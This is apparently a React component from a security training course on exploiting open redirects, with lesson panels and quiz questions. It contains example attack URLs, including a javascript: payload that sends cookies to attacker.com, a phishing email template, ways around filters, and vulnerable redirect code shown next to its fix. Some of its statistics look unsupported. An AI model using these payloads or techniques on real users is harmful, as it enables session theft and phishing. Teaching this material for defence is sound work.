import { useState } from "react";
import "./styles.scss";

export default function RedirectsExploitationTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "demonstrate-impact",
      title: "Demonstrate Attack Impact",
      description: "Show real-world consequences of open redirects",
      task: (
        <div className="task-box">
          <h4>Real-World Attack Scenarios</h4>

          <div className="impact-scenario high-impact">
            <div className="impact-badge critical">CRITICAL IMPACT</div>
            <h5>Scenario 1: OAuth Token Theft</h5>
            <div className="scenario-content">
              <p>
                <strong>Attack Flow:</strong>
              </p>
              <ol>
                <li>User clicks "Login with Google" on legitimate site</li>
                <li>OAuth flow includes redirect parameter</li>
                <li>Attacker modifies redirect to their site</li>
                <li>Google returns OAuth token to attacker's page</li>
                <li>Attacker gains full access to victim's account</li>
              </ol>
              <div className="example-code">
                <strong>Vulnerable OAuth Flow:</strong>
                <code>
                  https://accounts.google.com/oauth?redirect_uri=https://legitimate.com/callback
                </code>
                <strong>Exploited:</strong>
                <code>
                  https://accounts.google.com/oauth?redirect_uri=https://attacker.com/steal
                </code>
              </div>
              <div className="impact-metrics">
                <div className="metric">
                  <strong>Impact:</strong> Full account compromise
                </div>
                <div className="metric">
                  <strong>Severity:</strong> Critical (10/10)
                </div>
                <div className="metric">
                  <strong>Real Case:</strong> Google OAuth (2014)
                </div>
              </div>
            </div>
          </div>

          <div className="impact-scenario high-impact">
            <div className="impact-badge critical">CRITICAL IMPACT</div>
            <h5>Scenario 2: Banking Credentials Theft</h5>
            <div className="scenario-content">
              <p>
                <strong>Attack Flow:</strong>
              </p>
              <ol>
                <li>Phishing email: "Suspicious activity detected!"</li>
                <li>
                  Link: https://real-bank.com/logout?next=https://fake-bank.com
                </li>
                <li>Victim clicks, sees real bank domain</li>
                <li>Bank logs them out, redirects to phishing site</li>
                <li>Victim re-enters credentials on fake login page</li>
                <li>Credentials sent to attacker</li>
              </ol>
              <div className="phishing-visual">
                <div className="step-visual">
                  <span className="step-icon">üìß</span>
                  <p>Phishing Email</p>
                </div>
                <span className="arrow">‚Üí</span>
                <div className="step-visual">
                  <span className="step-icon">üè¶</span>
                  <p>Real Bank Domain</p>
                </div>
                <span className="arrow">‚Üí</span>
                <div className="step-visual">
                  <span className="step-icon">üé£</span>
                  <p>Fake Login Page</p>
                </div>
                <span className="arrow">‚Üí</span>
                <div className="step-visual">
                  <span className="step-icon">üí∞</span>
                  <p>Money Stolen</p>
                </div>
              </div>
              <div className="impact-metrics">
                <div className="metric">
                  <strong>Impact:</strong> Financial loss
                </div>
                <div className="metric">
                  <strong>Severity:</strong> Critical (9/10)
                </div>
                <div className="metric">
                  <strong>Success Rate:</strong> 30-60% click rate
                </div>
              </div>
            </div>
          </div>

          <div className="impact-scenario medium-impact">
            <div className="impact-badge warning">HIGH IMPACT</div>
            <h5>Scenario 3: Malware Distribution</h5>
            <div className="scenario-content">
              <p>
                <strong>Attack Flow:</strong>
              </p>
              <ol>
                <li>Trusted site has open redirect</li>
                <li>Attacker sends link to malware download</li>
                <li>URL shows trusted domain</li>
                <li>Redirects to malicious site with drive-by download</li>
                <li>Victim's computer infected</li>
              </ol>
              <div className="example-code">
                <code>
                  https://trusted-microsoft.com/download?url=https://malware-site.com/trojan.exe
                </code>
              </div>
              <div className="impact-metrics">
                <div className="metric">
                  <strong>Impact:</strong> Malware infection
                </div>
                <div className="metric">
                  <strong>Severity:</strong> High (8/10)
                </div>
              </div>
            </div>
          </div>

          <div className="statistics-box">
            <h5>Open Redirect Statistics (2023):</h5>
            <div className="stats-grid">
              <div className="stat-item">
                <strong>47%</strong>
                <p>of top 1000 websites vulnerable</p>
              </div>
              <div className="stat-item">
                <strong>$12,000</strong>
                <p>average bug bounty payout</p>
              </div>
              <div className="stat-item">
                <strong>32%</strong>
                <p>phishing success rate increase</p>
              </div>
              <div className="stat-item">
                <strong>8.7/10</strong>
                <p>average CVSS score</p>
              </div>
            </div>
          </div>
        </div>
      ),
      question: "What is the most dangerous consequence of open redirects?",
      options: [
        "Slower website performance",
        "OAuth token theft and full account compromise",
        "Better SEO",
        "Increased server load",
      ],
      correct: 1,
      explanation:
        "OAuth token theft is the most dangerous consequence because attackers can intercept authentication tokens, gaining complete access to victim accounts without needing to phish for credentials.",
    },
    {
      id: "chain-attacks",
      title: "Chain with Other Vulnerabilities",
      description: "Combine redirects with other attacks",
      task: (
        <div className="task-box">
          <h4>Attack Chaining Techniques</h4>

          <div className="chain-attack">
            <h5>Chain 1: Open Redirect + XSS</h5>
            <div className="chain-flow">
              <div className="chain-step">
                <span className="chain-icon">1</span>
                <div className="chain-content">
                  <strong>Open Redirect Found</strong>
                  <code>?url=javascript:alert(1)</code>
                </div>
              </div>
              <span className="chain-arrow">+</span>
              <div className="chain-step">
                <span className="chain-icon">2</span>
                <div className="chain-content">
                  <strong>JavaScript Protocol</strong>
                  <p>Executes XSS in victim's browser</p>
                </div>
              </div>
              <span className="chain-arrow">=</span>
              <div className="chain-result critical">
                <strong>Critical Vulnerability</strong>
                <p>Cookie theft, session hijacking</p>
              </div>
            </div>
            <div className="example-code">
              <strong>Exploit:</strong>
              <code>
                https://bank.com/redirect?url=javascript:fetch('https://attacker.com/?c='+document.cookie)
              </code>
            </div>
          </div>

          <div className="chain-attack">
            <h5>Chain 2: Open Redirect + CSRF</h5>
            <div className="chain-flow">
              <div className="chain-step">
                <span className="chain-icon">1</span>
                <div className="chain-content">
                  <strong>CSRF Attack Prepared</strong>
                  <p>Malicious action ready</p>
                </div>
              </div>
              <span className="chain-arrow">+</span>
              <div className="chain-step">
                <span className="chain-icon">2</span>
                <div className="chain-content">
                  <strong>Open Redirect Delivery</strong>
                  <p>Trusted URL in phishing email</p>
                </div>
              </div>
              <span className="chain-arrow">=</span>
              <div className="chain-result high">
                <strong>High Impact Attack</strong>
                <p>Unauthorized actions performed</p>
              </div>
            </div>
            <div className="example-code">
              <strong>Attack Flow:</strong>
              <pre>
                <code>{`1. Email: "Click to verify account"
2. Link: https://trusted.com/redirect?url=https://attacker.com/csrf-page.html
3. CSRF page auto-submits form to trusted.com
4. Victim's session used for malicious action`}</code>
              </pre>
            </div>
          </div>

          <div className="chain-attack">
            <h5>Chain 3: Open Redirect + Social Engineering</h5>
            <div className="chain-flow">
              <div className="chain-step">
                <span className="chain-icon">1</span>
                <div className="chain-content">
                  <strong>Create Sense of Urgency</strong>
                  <p>"Your account will be closed!"</p>
                </div>
              </div>
              <span className="chain-arrow">+</span>
              <div className="chain-step">
                <span className="chain-icon">2</span>
                <div className="chain-content">
                  <strong>Trusted Domain URL</strong>
                  <p>Open redirect provides legitimacy</p>
                </div>
              </div>
              <span className="chain-arrow">+</span>
              <div className="chain-step">
                <span className="chain-icon">3</span>
                <div className="chain-content">
                  <strong>Professional Phishing Page</strong>
                  <p>Identical to real site</p>
                </div>
              </div>
              <span className="chain-arrow">=</span>
              <div className="chain-result critical">
                <strong>Highly Effective Phishing</strong>
                <p>60%+ success rate</p>
              </div>
            </div>
          </div>

          <div className="defense-breaking">
            <h5>Bypassing Security Controls:</h5>
            <div className="bypass-grid">
              <div className="bypass-card">
                <strong>Email Filters</strong>
                <p>‚úì URL contains trusted domain</p>
                <p>‚úì Passes spam checks</p>
                <p>‚úì No URL shorteners detected</p>
              </div>
              <div className="bypass-card">
                <strong>User Awareness</strong>
                <p>‚úì Legitimate domain visible</p>
                <p>‚úì HTTPS lock icon present</p>
                <p>‚úì Appears in browser history</p>
              </div>
              <div className="bypass-card">
                <strong>Browser Protections</strong>
                <p>‚úì No phishing warning</p>
                <p>‚úì Certificate valid</p>
                <p>‚úì Not in blacklist</p>
              </div>
            </div>
          </div>

          <div className="success-box">
            <h5>Key Takeaway:</h5>
            <p>
              Open redirects are force multipliers - they make other attacks
              more effective by providing trusted domains and bypassing security
              controls.
            </p>
          </div>
        </div>
      ),
      question: "How can open redirect be chained with XSS?",
      options: [
        "It can't be chained",
        "Using javascript: protocol in redirect parameter to execute XSS",
        "By making the site faster",
        "Through database injection",
      ],
      correct: 1,
      explanation:
        "Open redirects can be chained with XSS by using dangerous protocols like javascript: in the redirect parameter, which executes JavaScript code in the victim's browser context.",
    },
    {
      id: "document-exploit",
      title: "Document Full Exploit",
      description: "Create complete exploitation report",
      task: (
        <div className="task-box">
          <h4>Exploitation Report Template</h4>

          <div className="report-template">
            <div className="report-section">
              <h5>1. Executive Summary</h5>
              <div className="report-content">
                <p>
                  <strong>Vulnerability:</strong> Unvalidated Open Redirect
                </p>
                <p>
                  <strong>Severity:</strong> High (CVSS 8.1/10)
                </p>
                <p>
                  <strong>Affected Endpoint:</strong> /login?redirect=
                </p>
                <p>
                  <strong>Impact:</strong> Credential theft via phishing, OAuth
                  token hijacking
                </p>
                <p>
                  <strong>Affected Users:</strong> All authenticated users
                </p>
              </div>
            </div>

            <div className="report-section">
              <h5>2. Technical Details</h5>
              <div className="technical-details">
                <div className="detail-item">
                  <strong>Vulnerability Type:</strong>
                  <p>
                    CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
                  </p>
                </div>
                <div className="detail-item">
                  <strong>Root Cause:</strong>
                  <pre>
                    <code>{`// Vulnerable Code
app.get('/login', (req, res) => {
  const redirectUrl = req.query.redirect;
  // NO VALIDATION!
  res.redirect(redirectUrl);
});`}</code>
                  </pre>
                </div>
                <div className="detail-item">
                  <strong>Exploitation Steps:</strong>
                  <ol>
                    <li>Identify redirect parameter: ?redirect=</li>
                    <li>Test with external domain</li>
                    <li>Create phishing page</li>
                    <li>Send malicious link to victims</li>
                    <li>Harvest credentials from phishing page</li>
                  </ol>
                </div>
              </div>
            </div>

            <div className="report-section">
              <h5>3. Proof of Concept</h5>
              <div className="poc-details">
                <div className="poc-step">
                  <strong>Step 1: Vulnerable URL</strong>
                  <code>
                    https://example.com/login?redirect=https://evil.com
                  </code>
                </div>
                <div className="poc-step">
                  <strong>Step 2: Phishing Email</strong>
                  <div className="email-preview">
                    <div className="email-header">
                      <strong>From:</strong> security@example.com (spoofed)
                      <br />
                      <strong>Subject:</strong> Urgent: Verify Your Account
                    </div>
                    <div className="email-body">
                      <p>Dear User,</p>
                      <p>Suspicious activity detected. Click to verify:</p>
                      <code className="fake-link">
                        https://example.com/login?redirect=...
                      </code>
                    </div>
                  </div>
                </div>
                <div className="poc-step">
                  <strong>Step 3: Credentials Captured</strong>
                  <div className="captured-data">
                    <code>username: victim@email.com</code>
                    <code>password: ‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢</code>
                    <code>IP: 192.168.1.100</code>
                    <code>timestamp: 2024-11-01 14:23:15</code>
                  </div>
                </div>
              </div>
            </div>

            <div className="report-section">
              <h5>4. Remediation</h5>
              <div className="remediation-steps">
                <div className="remedy-item priority-critical">
                  <span className="priority">CRITICAL</span>
                  <div className="remedy-content">
                    <strong>Implement Strict Whitelist</strong>
                    <pre>
                      <code>{`const allowedDomains = ['example.com', 'api.example.com'];
const url = new URL(redirectUrl, 'https://example.com');

if (!allowedDomains.includes(url.hostname)) {
  return res.status(400).send('Invalid redirect');
}

res.redirect(url.href);`}</code>
                    </pre>
                  </div>
                </div>

                <div className="remedy-item priority-high">
                  <span className="priority">HIGH</span>
                  <div className="remedy-content">
                    <strong>Validate Protocol</strong>
                    <pre>
                      <code>{`if (!['http:', 'https:'].includes(url.protocol)) {
  return res.status(400).send('Invalid protocol');
}`}</code>
                    </pre>
                  </div>
                </div>

                <div className="remedy-item priority-medium">
                  <span className="priority">MEDIUM</span>
                  <div className="remedy-content">
                    <strong>Use Relative Paths</strong>
                    <p>Prefer relative paths (/dashboard) over absolute URLs</p>
                  </div>
                </div>

                <div className="remedy-item priority-low">
                  <span className="priority">LOW</span>
                  <div className="remedy-content">
                    <strong>Add User Warning</strong>
                    <p>
                      Display "You are leaving example.com" warning for external
                      redirects
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div className="report-section">
              <h5>5. Timeline</h5>
              <div className="timeline">
                <div className="timeline-item">
                  <strong>2024-10-15:</strong> Vulnerability discovered
                </div>
                <div className="timeline-item">
                  <strong>2024-10-16:</strong> PoC created and tested
                </div>
                <div className="timeline-item">
                  <strong>2024-10-17:</strong> Report submitted to security team
                </div>
                <div className="timeline-item">
                  <strong>2024-10-20:</strong> Patch deployed to production
                </div>
                <div className="timeline-item">
                  <strong>2024-11-01:</strong> Public disclosure (90 days later)
                </div>
              </div>
            </div>
          </div>

          <div className="completion-box">
            <h5>Exploitation Phase Complete!</h5>
            <p>
              You've learned how to demonstrate real-world impact, chain
              attacks, and document comprehensive exploitation reports for open
              redirect vulnerabilities.
            </p>
          </div>
        </div>
      ),
      question: "What should a comprehensive exploit report include?",
      options: [
        "Only the vulnerable URL",
        "Executive summary, technical details, PoC, impact assessment, remediation, and timeline",
        "Just the fix code",
        "Only screenshots",
      ],
      correct: 1,
      explanation:
        "A comprehensive exploit report must include executive summary for stakeholders, technical details for developers, proof of concept for reproduction, impact assessment for risk evaluation, detailed remediation steps, and a responsible disclosure timeline.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("exploitation");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="redirects-exploitation-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "‚úì" : "‚úó") : "‚óã"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button onClick={handleRestart} className="restart-button">
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
        <div className="navigation-buttons">
          <button
            onClick={goPrev}
            disabled={currentStep === 0}
            className="nav-button prev-button"
          >
            Previous
          </button>

          {completedSteps.includes(currentStep) &&
            currentStep < steps.length - 1 && (
              <button onClick={goNext} className="nav-button next-button">
                Next
              </button>
            )}

          {completedSteps.length === steps.length && (
            <button className="nav-button complete-button">
              Phase completed!
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
